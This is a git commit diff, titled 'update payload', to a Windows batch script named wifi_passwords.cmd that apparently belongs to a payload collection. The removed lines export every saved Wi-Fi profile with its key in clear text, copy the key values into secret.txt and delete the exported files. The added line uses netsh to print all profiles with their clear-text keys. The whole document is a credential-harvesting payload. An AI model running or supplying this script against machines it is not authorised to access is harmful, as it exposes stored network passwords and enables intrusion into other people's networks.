1be3abd2bc0f5fa4670a186cac9c790ce3adc280
Daniel Kenan Slinda <sdanielkenan@gmail.com>
2024-09-02 22:33:10 +0200

    update payload

--- windows/wifi_passwords.cmd
+++ windows/wifi_passwords.cmd
@@ -1,3 +1,1 @@
-netsh wlan export profile key=clear folder=.
-for /f "tokens=2 delims=: " %%i in ('findstr /i "Key Content" *.xml') do echo %%i >> secret.txt
-del *.xml
+netsh wlan show profiles * key="clear"
